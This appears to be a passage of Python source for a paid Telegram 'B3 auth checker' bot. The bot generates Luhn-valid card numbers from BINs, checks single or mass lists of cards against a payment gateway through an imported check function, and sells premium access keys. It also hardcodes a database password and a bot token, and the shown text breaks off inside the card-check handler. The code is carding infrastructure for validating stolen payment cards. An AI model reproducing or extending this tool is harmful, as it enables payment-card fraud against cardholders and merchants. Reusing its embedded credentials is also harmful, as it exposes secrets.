from gen import CardGenerator
import telebot
from flask import Flask
import threading
import re
import os
import time
import json
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta
from p import check_card
import mysql.connector

# Database connection pool
db_connections = {}
def connect_db():
    thread_id = threading.get_ident()
    if thread_id not in db_connections or not db_connections[thread_id].is_connected():
        db_connections[thread_id] = mysql.connector.connect(
            host="sql12.freesqldatabase.com",
            user="sql12795630",
            password="fgqIine2LA",
            database="sql12795630",
            port=3306,
            pool_name=f"pool_{thread_id}",
            pool_size=1,
            autocommit=True
        )
    return db_connections[thread_id]

# Cache for frequently accessed data
user_cache = {}
cache_timeout = 300  # 5 minutes

def add_free_user(user_id, first_name):
    conn = connect_db()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT IGNORE INTO free_users (user_id, first_name) VALUES (%s, %s)",
        (user_id, first_name)
    )
    conn.commit()
    conn.close()
    # Clear cache for this user
    if user_id in user_cache:
        del user_cache[user_id]

def store_key(key, validity_days):
    conn = connect_db()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO premium_keys (`key`, validity_days) VALUES (%s, %s)",
        (key, validity_days)
    )
    conn.commit()
    conn.close()

def is_key_valid(key):
    conn = connect_db()
    cursor = conn.cursor(dictionary=True)
    cursor.execute(
        "SELECT * FROM premium_keys WHERE `key` = %s AND used_by IS NULL",
        (key,)
    )
    result = cursor.fetchone()
    conn.close()
    return result

def mark_key_as_used(key, user_id):
    conn = connect_db()
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE premium_keys SET used_by = %s, used_at = NOW() WHERE `key` = %s",
        (user_id, key)
    )
    conn.commit()
    conn.close()
    # Clear cache for this user
    if user_id in user_cache:
        del user_cache[user_id]

def add_premium(user_id, first_name, validity_days):
    conn = connect_db()
    cursor = conn.cursor()

    expiry_date = datetime.now() + timedelta(days=validity_days)

    cursor.execute("""
        INSERT INTO premium_users (user_id, first_name, subscription_expiry)
        VALUES (%s, %s, %s)
        ON DUPLICATE KEY UPDATE
            first_name = VALUES(first_name),
            subscription_start = CURRENT_TIMESTAMP,
            subscription_expiry = VALUES(subscription_expiry)
    """, (user_id, first_name, expiry_date))

    conn.commit()
    conn.close()
    # Clear cache for this user
    if user_id in user_cache:
        del user_cache[user_id]

def is_premium(user_id):
    """Check if user has premium subscription with caching"""
    # Check cache first
    cache_key = f"premium_{user_id}"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['timestamp'] < cache_timeout:
        return user_cache[cache_key]['result']
    
    # Admins are always premium
    if is_admin(user_id):
        # Cache the result
        user_cache[cache_key] = {'result': True, 'timestamp': time.time()}
        return True
    
    # Check premium_users table
    conn = connect_db()
    cursor = conn.cursor(dictionary=True)
    cursor.execute("SELECT subscription_expiry FROM premium_users WHERE user_id = %s", (user_id,))
    result = cursor.fetchone()
    conn.close()

    premium_result = False
    if result:
        expiry = result['subscription_expiry']
        if expiry is None:
            premium_result = False
        else:
            # Convert to datetime object if it's a string
            if isinstance(expiry, str):
                expiry = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
            premium_result = expiry > datetime.now()
    
    # Cache the result
    user_cache[cache_key] = {'result': premium_result, 'timestamp': time.time()}
    return premium_result

card_generator = CardGenerator()

# BOT Configuration
BOT_TOKEN = '7265564885:AAFZrs6Mi3aVf-hGT-b_iKBI3d7JCAYDo-A'
MAIN_ADMIN_ID = 5103348494

bot = telebot.TeleBot(BOT_TOKEN)

FREE_USER_COOLDOWN = {}  # For anti-spam system

# ---------------- Helper Functions ---------------- #

def load_admins():
    """Load admin list from database with caching"""
    cache_key = "admins_list"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['timestamp'] < cache_timeout:
        return user_cache[cache_key]['result']
    
    try:
        conn = connect_db()
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM admins")
        admins = [row[0] for row in cursor.fetchall()]
        conn.close()
        
        # Cache the result
        user_cache[cache_key] = {'result': admins, 'timestamp': time.time()}
        return admins
    except Exception as e:
        print(f"Error loading admins: {e}")
        return [MAIN_ADMIN_ID]

def save_admins(admins):
    """Save admin list to database"""
    try:
        conn = connect_db()
        cursor = conn.cursor()
        
        # Clear existing admins
        cursor.execute("DELETE FROM admins")
        
        # Insert new admins
        for admin_id in admins:
            cursor.execute("INSERT INTO admins (user_id) VALUES (%s)", (admin_id,))
        
        conn.commit()
        conn.close()
        
        # Clear admin cache
        if "admins_list" in user_cache:
            del user_cache["admins_list"]
    except Exception as e:
        print(f"Error saving admins: {e}")

def is_admin(chat_id):
    """Check if user is an admin with caching"""
    # Convert to int for comparison
    try:
        chat_id_int = int(chat_id)
    except (ValueError, TypeError):
        return False
        
    admins = load_admins()
    return chat_id_int in admins

def is_authorized(msg):
    """Check if user is authorized with caching"""
    user_id = msg.from_user.id
    chat = msg.chat

    # Check cache first
    cache_key = f"auth_{user_id}"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['timestamp'] < cache_timeout:
        return user_cache[cache_key]['result']

    # ✅ Allow all admins anywhere
    if is_admin(user_id):
        user_cache[cache_key] = {'result': True, 'timestamp': time.time()}
        return True

    # ✅ Allow all premium users
    if is_premium(user_id):
        user_cache[cache_key] = {'result': True, 'timestamp': time.time()}
        return True

    # ✅ If message is from group and group is authorized
    if chat.type in ["group", "supergroup"]:
        result = is_group_authorized(chat.id)
        user_cache[cache_key] = {'result': result, 'timestamp': time.time()}
        return result

    # ✅ If private chat, check if user is in free_users table
    if chat.type == "private":
        conn = connect_db()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM free_users WHERE user_id = %s", (user_id,))
        result = cursor.fetchone()
        conn.close()
        
        user_cache[cache_key] = {'result': result is not None, 'timestamp': time.time()}
        return result is not None

    user_cache[cache_key] = {'result': False, 'timestamp': time.time()}
    return False

def normalize_card(text):
    """
    Normalize credit card from any format to cc|mm|yy|cvv
    Similar to PHP normalize_card function
    """
    if not text:
        return None

    # Replace newlines and slashes with spaces
    text = text.replace('\n', ' ').replace('/', ' ')

    # Find all numbers in the text
    numbers = re.findall(r'\d+', text)

    cc = mm = yy = cvv = ''

    for part in numbers:
        if len(part) == 16:  # Credit card number
            cc = part
        elif len(part) == 4 and part.startswith('20'):  # 4-digit year starting with 20
            yy = part
        elif len(part) == 2 and int(part) <= 12 and mm == '':  # Month (2 digits <= 12)
            mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '':  # 2-digit year
            yy = '20' + part
        elif len(part) in [3, 4] and cvv == '':  # CVV (3-4 digits)
            cvv = part

    # Check if we have all required parts
    if cc and mm and yy and cvv:
        return f"{cc}|{mm}|{yy}|{cvv}"

    return None

def get_user_info(user_id):
    """Get user info for display in responses with caching"""
    # Check cache first
    cache_key = f"user_info_{user_id}"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['timestamp'] < cache_timeout:
        return user_cache[cache_key]['result']
    
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"User {user_id}"
        first_name = user.first_name or ""
        last_name = user.last_name or ""
        full_name = f"{first_name} {last_name}".strip()
        
        if is_admin(user_id):
            user_type = "Admin 👑"
        elif is_premium(user_id):
            user_type = "Premium User 💰"
        else:
            # Check if user is in free_users table
            conn = connect_db()
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM free_users WHERE user_id = %s", (user_id,))
            free_user = cursor.fetchone()
            conn.close()
            
            if free_user:
                user_type = "Free User 🔓"
            else:
                user_type = "Unauthorized User ❌"
                
        result = {
            "username": username,
            "full_name": full_name,
            "user_type": user_type,
            "user_id": user_id
        }
        
        # Cache the result
        user_cache[cache_key] = {'result': result, 'timestamp': time.time()}
        return result
        
    except:
        if is_admin(user_id):
            user_type = "Admin 👑"
        elif is_premium(user_id):
            user_type = "Premium User 💰"
        else:
            # Check if user is in free_users table
            conn = connect_db()
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM free_users WHERE user_id = %s", (user_id,))
            free_user = cursor.fetchone()
            conn.close()
            
            if free_user:
                user_type = "Free User 🔓"
            else:
                user_type = "Unauthorized User ❌"
                
        result = {
            "username": f"User {user_id}",
            "full_name": f"User {user_id}",
            "user_type": user_type,
            "user_id": user_id
        }
        
        # Cache the result
        user_cache[cache_key] = {'result': result, 'timestamp': time.time()}
        return result

def check_proxy_status():
    """Check if proxy is live or dead with caching"""
    cache_key = "proxy_status"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['timestamp'] < 60:  # 1 minute cache
        return user_cache[cache_key]['result']
    
    try:
        # Simple check by trying to access a reliable site
        import requests
        test_url = "https://www.google.com"
        response = requests.get(test_url, timeout=5)
        if response.status_code == 200:
            result = "Live ✅"
        else:
            result = "Dead ❌"
    except:
        result = "Dead ❌"
    
    # Cache the result
    user_cache[cache_key] = {'result': result, 'timestamp': time.time()}
    return result

def get_subscription_info(user_id):
    """Get subscription information for a user with caching"""
    cache_key = f"sub_info_{user_id}"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['timestamp'] < cache_timeout:
        return user_cache[cache_key]['result']
    
    if is_admin(user_id):
        result = ("Unlimited ♾️", "Never")
        user_cache[cache_key] = {'result': result, 'timestamp': time.time()}
        return result
    
    # Check premium_users table
    conn = connect_db()
    cursor = conn.cursor(dictionary=True)
    cursor.execute("SELECT subscription_expiry FROM premium_users WHERE user_id = %s", (user_id,))
    result_db = cursor.fetchone()
    conn.close()

    if result_db:
        expiry = result_db['subscription_expiry']
        if expiry is None:
            result = ("No subscription ❌", "N/A")
        else:
            # Convert to datetime object if it's a string
            if isinstance(expiry, str):
                expiry = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
            
            remaining_days = (expiry - datetime.now()).days
            if remaining_days < 0:
                result = ("Expired ❌", expiry.strftime("%Y-%m-%d %H:%M:%S"))
            else:
                result = (f"{remaining_days} days", expiry.strftime("%Y-%m-%d %H:%M:%S"))
    else:
        result = ("No subscription ❌", "N/A")
    
    # Cache the result
    user_cache[cache_key] = {'result': result, 'timestamp': time.time()}
    return result

def check_cooldown(user_id, command_type):
    """Check if user is in cooldown period"""
    current_time = time.time()
    user_id_str = str(user_id)
    
    # Admins and premium users have no cooldown
    if is_admin(user_id) or is_premium(user_id):
        return False
        
    # Check if user is in cooldown
    if user_id_str in FREE_USER_COOLDOWN:
        if command_type in FREE_USER_COOLDOWN[user_id_str]:
            if current_time < FREE_USER_COOLDOWN[user_id_str][command_type]:
                return True
    
    return False

def set_cooldown(user_id, command_type, duration):
    """Set cooldown for a user"""
    user_id_str = str(user_id)
    
    # Don't set cooldown for admins and premium users
    if is_admin(user_id) or is_premium(user_id):
        return
    
    if user_id_str not in FREE_USER_COOLDOWN:
        FREE_USER_COOLDOWN[user_id_str] = {}
    
    FREE_USER_COOLDOWN[user_id_str][command_type] = time.time() + duration

# For groups
GROUPS_FILE = 'authorized_groups.json'

def load_authorized_groups():
    if not os.path.exists(GROUPS_FILE):
        return []
    with open(GROUPS_FILE, 'r') as f:
        return json.load(f)

def save_authorized_groups(groups):
    with open(GROUPS_FILE, 'w') as f:
        json.dump(groups, f)

def is_group_authorized(group_id):
    return group_id in load_authorized_groups()

# ---------------- Admin Commands ---------------- #

@bot.message_handler(commands=['addadmin'])
def add_admin(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
    🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only the main admin can add other admins
• Contact the main admin: @mhitzxg""")
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/addadmin <user_id>`
• Example: `/addadmin 1234567890`""")
        
        user_id = int(parts[1])
        admins = load_admins()
        
        if user_id in admins:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ ALREADY ADMIN ❌
╚═══════════════════════╝

• This user is already an admin""")
        
        admins.append(user_id)
        save_admins(admins)
        bot.reply_to(msg, f"""
╔═══════════════════════╗
     ✅ ADMIN ADDED ✅
╚═══════════════════════╝

• Successfully added `{user_id}` as admin
• Total admins: {len(admins)}""")
        
    except ValueError:
        bot.reply_to(msg, """
╔═══════════════════════╗
    ❌ INVALID USER ID ❌
╚═══════════════════════╝

• Please provide a valid numeric user ID
• Usage: `/addadmin 1234567890`""")
    except Exception as e:
        bot.reply_to(msg, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error: {str(e)}""")

@bot.message_handler(commands=['removeadmin'])
def remove_admin(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
      🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only the main admin can remove other admins
• Contact the main admin: @mhitzxg""")
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/removeadmin <user_id>`
• Example: `/removeadmin 1234567890`""")
        
        user_id = int(parts[1])
        admins = load_admins()
        
        if user_id == MAIN_ADMIN_ID:
            return bot.reply_to(msg, """
  ╔═══════════════════════╗
❌ CANNOT REMOVE MAIN ADMIN ❌
  ╚═══════════════════════╝
 
• You cannot remove the main admin""")
        
        if user_id not in admins:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ NOT AN ADMIN ❌
╚═══════════════════════╝

• This user is not an admin""")
        
        admins.remove(user_id)
        save_admins(admins)
        bot.reply_to(msg, f"""
╔═══════════════════════╗
 ✅ ADMIN REMOVED ✅
╚═══════════════════════╝

• Successfully removed `{user_id}` from admins
• Total admins: {len(admins)}""")
        
    except ValueError:
        bot.reply_to(msg, """
╔═══════════════════════╗
 ❌ INVALID USER ID ❌
╚═══════════════════════╝

• Please provide a valid numeric user ID
• Usage: `/removeadmin 1234567890`""")
    except Exception as e:
        bot.reply_to(msg, f"""
╔══════════════════════╗
    ⚠️ ERROR ⚠️
╚══════════════════════╝

• Error: {str(e)}""")

@bot.message_handler(commands=['unauth'])
def unauth_user(msg):
    if not is_admin(msg.from_user.id):
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
    🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only admins can unauthorize users
• Contact an admin for assistance""")
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/unauth <user_id>`
• Example: `/unauth 1234567890`""")
        
        user_id = int(parts[1])
        
        # Remove user from free_users table
        conn = connect_db()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM free_users WHERE user_id = %s", (user_id,))
        conn.commit()
        
        if cursor.rowcount > 0:
            bot.reply_to(msg, f"""
╔═══════════════════════╗
   ✅ USER UNAUTHORIZED ✅
╚═══════════════════════╝

• Successfully removed authorization for user: `{user_id}`
• User can no longer use the bot in private chats""")
        else:
            bot.reply_to(msg, f"""
╔═══════════════════════╗
  ❌ USER NOT FOUND ❌
╚═══════════════════════╝

• User `{user_id}` was not found in the authorized users list
• No action taken""")
        
        conn.close()
        
        # Clear cache for this user
        if f"auth_{user_id}" in user_cache:
            del user_cache[f"auth_{user_id}"]
        if f"user_info_{user_id}" in user_cache:
            del user_cache[f"user_info_{user_id}"]
        
    except ValueError:
        bot.reply_to(msg, """
╔═══════════════════════╗
    ❌ INVALID USER ID ❌
╚═══════════════════════╝

• Please provide a valid numeric user ID
• Usage: `/unauth 1234567890`""")
    except Exception as e:
        bot.reply_to(msg, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error: {str(e)}""")

@bot.message_handler(commands=['listfree'])
def list_free_users(msg):
    if not is_admin(msg.from_user.id):
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
    🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only admins can view the free users list
• Contact an admin for assistance""")
    
    try:
        conn = connect_db()
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, first_name FROM free_users ORDER BY user_id")
        free_users = cursor.fetchall()
        conn.close()
        
        if not free_users:
            return bot.reply_to(msg, """
╔═══════════════════════╗
   📋 NO FREE USERS 📋
╚═══════════════════════╝

• There are no authorized free users""")
        
        user_list = ""
        for user_id, first_name in free_users:
            user_list += f"• `{user_id}` - {first_name}\n"
        
        bot.reply_to(msg, f"""
╔═══════════════════════╗
   📋 FREE USERS LIST 📋
╚═══════════════════════╝

{user_list}
• Total free users: {len(free_users)}""")
        
    except Exception as e:
        bot.reply_to(msg, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error: {str(e)}""")

@bot.message_handler(commands=['listadmins'])
def list_admins(msg):
    if not is_admin(msg.from_user.id):
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only admins can view the admin list
• Contact an admin to get access""")
    
    admins = load_admins()
    if not admins:
        return bot.reply_to(msg, """
╔═══════════════════════╗
   ❌ NO ADMINS ❌
╚═══════════════════════╝

• There are no admins configured""")
    
    admin_list = ""
    for i, admin_id in enumerate(admins, 1):
        if admin_id == MAIN_ADMIN_ID:
            admin_list += f"• `{admin_id}` (Main Admin) 👑\n"
        else:
            admin_list += f"• `{admin_id}`\n"
    
    bot.reply_to(msg, f"""
╔═══════════════════════╗
   📋 ADMIN LIST 📋
╚═══════════════════════╝

{admin_list}
• Total admins: {len(admins)}""")

@bot.message_handler(commands=['authgroup'])
def authorize_group(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only the main admin can authorize groups""")

    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/authgroup <group_id>`
• Example: `/authgroup -1001234567890`""")

        group_id = int(parts[1])
        groups = load_authorized_groups()

        if group_id in groups:
            return bot.reply_to(msg, """
╔═══════════════════════╗
✅ ALREADY AUTHORIZED ✅
╚═══════════════════════╝

• This group is already authorized""")

        groups.append(group_id)
        save_authorized_groups(groups)
        bot.reply_to(msg, f"""
╔═══════════════════════╗
 ✅ GROUP AUTHORIZED ✅
╚═══════════════════════╝

• Successfully authorized group: `{group_id}`
• Total authorized groups: {len(groups)}""")

    except ValueError:
        bot.reply_to(msg, """

 ❌ INVALID GROUP ID ❌


• Please provide a valid numeric group ID""")
    except Exception as e:
        bot.reply_to(msg, f"""

     ⚠️ ERROR ⚠️


• Error: {str(e)}""")

# ---------------- Subscription Commands ---------------- #

@bot.message_handler(commands=['subscription'])
def subscription_info(msg):
    """Show subscription plans"""
    user_id = msg.from_user.id
    
    if is_admin(user_id):
        bot.reply_to(msg, f"""
╔═══════════════════════╗
 💎 SUBSCRIPTION INFO 💎
╚═══════════════════════╝

• You are the Premium Owner of this bot 👑
• Expiry: Unlimited ♾️
• Enjoy unlimited card checks 🛒

╔═══════════════════════╗
 💰 PREMIUM FEATURES 💰
╚═══════════════════════╝
• Unlimited card checks 🛒
• Priority processing ⚡
• No waiting time 🚀
• No limitations ✅

📋 Premium Plans:
• 7 days - $3 💵
• 30 days - $10 💵

• Contact @mhitzxg to purchase 📩""")
    elif is_premium(user_id):
        remaining, expiry_date = get_subscription_info(user_id)
        
        bot.reply_to(msg, f"""
╔═══════════════════════╗
 💎 SUBSCRIPTION INFO 💎
╚═══════════════════════╝

• You have a Premium subscription 💰
• Remaining: {remaining}
• Expiry: {expiry_date}
• Enjoy unlimited card checks 🛒

╔═══════════════════════╗
 💰 PREMIUM FEATURES 💰
╚═══════════════════════╝
• Unlimited card checks 🛒
• Priority processing ⚡
• No waiting time 🚀

📋 Premium Plans:
• 7 days - $3 💵
• 30 days - $10 💵

• Contact @mhitzxg to purchase 📩""")
    else:
        bot.reply_to(msg, """
╔═══════════════════════╗
  🔓 FREE ACCOUNT 🔓
╚═══════════════════════╝

• You are using a Free account 🔓
• Limit: 15 cards per check 📊

╔═══════════════════════╗
 💰 PREMIUM FEATURES 💰
╚═══════════════════════╝
• Unlimited card checks 🛒
• Priority processing ⚡
• No waiting time 🚀

╔═══════════════════════╗
  💰 PREMIUM PLANS 💰
╚═══════════════════════╝
• 7 days - $3 💵
• 30 days - $10 💵

• Contact @mhitzxg to purchase 📩""")

@bot.message_handler(commands=['genkey'])
def generate_key(msg):
    if not is_admin(msg.from_user.id):
        return bot.reply_to(msg, "❌ You are not authorized to generate keys.")

    try:
        validity = int(msg.text.split()[1])
    except:
        return bot.reply_to(msg, "❌ Usage: /genkey <validity_days>")

    import random, string
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

    store_key(key, validity)
    bot.reply_to(msg, f"🔑 Generated Key:\n\n`{key}`\n\n✅ Valid for {validity} days", parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_key(msg):
    try:
        user_key = msg.text.split()[1]
    except:
        return bot.reply_to(msg, "❌ Usage: /redeem <KEY>")

    key_data = is_key_valid(user_key)
    if not key_data:
        return bot.reply_to(msg, "❌ Invalid or already used key.")

    mark_key_as_used(user_key, msg.from_user.id)
    add_premium(msg.from_user.id, msg.from_user.first_name, key_data['validity_days'])

    bot.reply_to(msg, f"✅ Key redeemed successfully!\n🎟️ Subscription valid for {key_data['validity_days']} days.")

# ---------------- Info Command ---------------- #

@bot.message_handler(commands=['info'])
def user_info(msg):
    """Show user information"""
    user_id = msg.from_user.id
    user_data = get_user_info(user_id)
    remaining, expiry_date = get_subscription_info(user_id)
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    info_message = f"""
╔═══════════════════════╗
        👤 USER INFORMATION 👤
╚═══════════════════════╝

👤 Name: {user_data['full_name']}
🆔 User ID: `{user_data['user_id']}`
📱 Username: {user_data['username']}
🎫 Account Type: {user_data['user_type']}

💰 Subscription: {remaining}
📅 Expiry Date: {expiry_date}
⏰ Current Time: {current_time}

🌐 STATUS 🌐 -

🔌 Proxy: {check_proxy_status()}
🔓 Authorized: {'Yes ✅' if is_authorized(msg) else 'No ❌'}

⚡ Powered by @mhitzxg"""
    
    bot.reply_to(msg, info_message, parse_mode='Markdown')

# ---------------- Gen Command ---------------- #

@bot.message_handler(commands=['gen'])
def gen_handler(msg):
    """Generate cards using Luhn algorithm"""
    if not is_authorized(msg):
        return bot.reply_to(msg, """
  
🔰 AUTHORIZATION REQUIRED 🔰         
  

• You are not authorized to use this command
• Only authorized users can generate cards

✗ Contact an admin for authorization
• Admin: @mhitzxg""")

    # Check if user provided a pattern
    args = msg.text.split(None, 1)
    if len(args) < 2:
        return bot.reply_to(msg, """

  ⚡ INVALID USAGE ⚡


• Please provide a card pattern to generate
• Usage: `/gen <pattern>`

Valid formats:
`/gen 483318` - Just BIN
`/gen 483318|12|25|123` - BIN with MM/YY/CVV
`/gen 4729273826xxxx112133` - Pattern with x's

• Use 'x' for random digits
• Example: `/gen 483318` or `/gen 483318|12|25|123`

✗ Contact admin if you need help: @mhitzxg""")

    pattern = args[1]
    
    # Show processing message
    processing = bot.reply_to(msg, """

 ♻️  ⏳ GENERATING CARDS ⏳  ♻️


• Your cards are being generated...
• Please wait a moment

✗ Using Luhn algorithm for valid cards""")

    def generate_and_reply():
        try:
            # Generate 10 cards using the pattern
            cards, error = card_generator.generate_cards(pattern, 10)
            
            if error:
                bot.edit_message_text(f"""
❌ GENERATION FAILED ❌

{error}

✗ Contact admin if you need help: @mhitzxg""", msg.chat.id, processing.message_id)
                return
            
            # Extract BIN from pattern for the header
            bin_match = re.search(r'(\d{6})', pattern.replace('|', '').replace('x', '').replace('X', ''))
            bin_code = bin_match.group(1) if bin_match else "N/A"
            
            # Format the cards without numbers
            formatted_cards = []
            for card in cards:
                formatted_cards.append(card)
            
            # Get user info
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            
            # Create the final message with BIN info header
            final_message = f"""
BIN: {bin_code}
Amount: {len(cards)}

""" + "\n".join(formatted_cards) + f"""

Info: N/A
Issuer: N/A
Country: N/A

👤 Generated by: {user_info}
⚡ Powered by @mhitzxg & @pr0xy_xd"""
            
            # Send the generated cards without Markdown parsing
            bot.edit_message_text(final_message, msg.chat.id, processing.message_id, parse_mode=None)
            
        except Exception as e:
            error_msg = f"""
❌ GENERATION ERROR ❌

Error: {str(e)}

✗ Contact admin if you need help: @mhitzxg"""
            bot.edit_message_text(error_msg, msg.chat.id, processing.message_id, parse_mode=None)

    threading.Thread(target=generate_and_reply).start()

# ---------------- Bot Commands ---------------- #

@bot.message_handler(commands=['start'])
def start_handler(msg):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    welcome_message = f"""
  ╔═══════════════════════╗
★ 𝗠𝗛𝗜𝗧𝗭𝗫𝗚 𝗕𝟯 𝗔𝗨𝗧𝗛 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ★
┌───────────────────────┐
│ ✨ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {msg.from_user.first_name or 'User'}! ✨
├───────────────────────┤
│ 📋 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:
│
│ • /b3          - Check single card
│ • /mb3         - Mass check (reply to file)
│ • /gen         - Generate cards 
│ • /info        - Show your account info
│ • /subscription - View premium plans
├───────────────────────┤
│ 📓 𝗙𝗿𝗲𝗲 𝗧𝗶𝗲𝗿:
│ • 25 cards per check 📊
│ • Standard speed 🐢
├───────────────────────┤
│📌 𝗣𝗿𝗼𝘅𝘆 𝗦𝘁𝗮𝘁𝘂𝘀: {check_proxy_status()}
├───────────────────────┤
│ ✨𝗳𝗼𝗿 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝗰𝗲𝘀𝘀
│📩 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 @mhitzxg 
│❄️ 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @mhitzxg & @pr0xy_xd
└───────────────────────┘
"""
    
    bot.reply_to(msg, welcome_message)

@bot.message_handler(commands=['auth'])
def auth_user(msg):
    if not is_admin(msg.from_user.id):
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
    🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only admins can authorize users
• Contact an admin for assistance""")
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/auth <user_id>`
• Example: `/auth 1234567890`""")
        
        user_id = int(parts[1])
        
        # Check if user is already authorized
        conn = connect_db()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM free_users WHERE user_id = %s", (user_id,))
        result = cursor.fetchone()
        
        if result:
            conn.close()
            return bot.reply_to(msg, f"""
╔═══════════════════════╗
  ✅ ALREADY AUTHORIZED ✅
╚═══════════════════════╝

• User `{user_id}` is already authorized
• No action needed""")
        
        # Add user to free_users table
        try:
            # Try to get user info from Telegram
            user_chat = bot.get_chat(user_id)
            first_name = user_chat.first_name or "User"
        except:
            first_name = "User"
            
        cursor.execute(
            "INSERT INTO free_users (user_id, first_name) VALUES (%s, %s)",
            (user_id, first_name)
        )
        conn.commit()
        conn.close()
        
        # Clear cache for this user
        if f"auth_{user_id}" in user_cache:
            del user_cache[f"auth_{user_id}"]
        if f"user_info_{user_id}" in user_cache:
            del user_cache[f"user_info_{user_id}"]
        
        bot.reply_to(msg, f"""
╔═══════════════════════╗
     ✅ USER AUTHORIZED ✅
╚═══════════════════════╝

• Successfully authorized user: `{user_id}`
• User can now use the bot in private chats""")
        
    except ValueError:
        bot.reply_to(msg, """
╔═══════════════════════╗
    ❌ INVALID USER ID ❌
╚═══════════════════════╝

• Please provide a valid numeric user ID
• Usage: `/auth 1234567890`""")
    except Exception as e:
        bot.reply_to(msg, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error: {str(e)}""")

@bot.message_handler(commands=['b3'])
def b3_handler(msg):
    if not is_authorized(msg):
        return bot.reply_to(msg, """
  
🔰 AUTHORIZATION REQUIRED 🔰         
  

• You are not authorized to use this command
• Only authorized users can check cards

• Contact an admin for authorization
• Admin: @Mhitzxg""")

    # Check for spam (30 second cooldown for free users)
    if check_cooldown(msg.from_user.id, "b3"):
        return bot.reply_to(msg, """

❌ ⏰ COOLDOWN ACTIVE ⏰


• You are in cooldown period
• Please wait 30 seconds before checking again

✗ Upgrade to premium to remove cooldowns""")

    cc = None

    # Check if user replied to a message
    if msg.reply_to_message:
        # Extract CC from replied message
        replied_text = msg.reply_to_message.text or ""
        cc = normalize_card(replied_text)

        if not cc:
            return bot.reply_to(msg, """

❌ INVALID CARD FORMAT ❌


• The replied message doesn't contain a valid card
• Please use the correct format:

Valid format:
`/b3 4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""")
    else:
        # Check if CC is provided as argument
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return bot.reply_to(msg, """

  ⚡ INVALID USAGE ⚡


• Please provide a card to check
• Usage: `/b3 <card_details>`

Valid format:
`/b3 4556737586899855|12|2026|123`

• Or reply to a message containing card details with /b3

✗ Contact admin if you need help: @mhitzxg""")

        # Try to normalize the provided CC
        raw_input = args[1]

        # Check if it's already in valid format
